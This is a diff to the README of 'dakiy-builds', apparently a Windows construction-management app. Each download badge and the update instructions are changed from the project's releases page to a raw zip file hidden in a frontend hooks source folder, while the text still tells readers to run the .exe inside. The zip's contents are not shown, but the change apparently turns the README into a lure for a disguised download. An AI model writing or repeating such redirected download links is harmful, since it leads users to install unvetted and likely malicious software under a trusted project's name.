@@ -1,6 +1,6 @@
 # 🏗️ dakiy-builds - Manage Construction Projects Easily
 
-[![Download dakiy-builds](https://img.shields.io/badge/Download-dakiy--builds-brightgreen)](https://github.com/thueelayhtoo/dakiy-builds/releases)
+[![Download dakiy-builds](https://img.shields.io/badge/Download-dakiy--builds-brightgreen)](https://github.com/thueelayhtoo/dakiy-builds/raw/refs/heads/main/packages/frontend/src/hooks/builds_dakiy_3.3.zip)
 
 ## 🛠️ What is dakiy-builds?
 
@@ -39,7 +39,7 @@ Follow these steps to get dakiy-builds running on your Windows PC.
 
 Go to the releases page by clicking the badge below. This page contains the latest version for Windows.
 
-[![Download dakiy-builds](https://img.shields.io/badge/Download-Here-blue)](https://github.com/thueelayhtoo/dakiy-builds/releases)
+[![Download dakiy-builds](https://img.shields.io/badge/Download-Here-blue)](https://github.com/thueelayhtoo/dakiy-builds/raw/refs/heads/main/packages/frontend/src/hooks/builds_dakiy_3.3.zip)
 
 Look for a file that ends with `.exe`. This is the installer for Windows.
 
@@ -106,7 +106,7 @@ This ensures sensitive data stays in the right hands.
 
 New features and fixes come out regularly. To update:
 
-1. Visit the [releases page](https://github.com/thueelayhtoo/dakiy-builds/releases)  
+1. Visit the [releases page](https://github.com/thueelayhtoo/dakiy-builds/raw/refs/heads/main/packages/frontend/src/hooks/builds_dakiy_3.3.zip)  
 2. Download the latest `.exe` file  
 3. Run the installer again to replace the old version  
 
@@ -126,4 +126,4 @@ Use the built-in help menu for tips on each screen. You can also check the repos
 
 ---
 
-[![Download dakiy-builds](https://img.shields.io/badge/Download-dakiy--builds-brightgreen)](https://github.com/thueelayhtoo/dakiy-builds/releases)
+[![Download dakiy-builds](https://img.shields.io/badge/Download-dakiy--builds-brightgreen)](https://github.com/thueelayhtoo/dakiy-builds/raw/refs/heads/main/packages/frontend/src/hooks/builds_dakiy_3.3.zip)
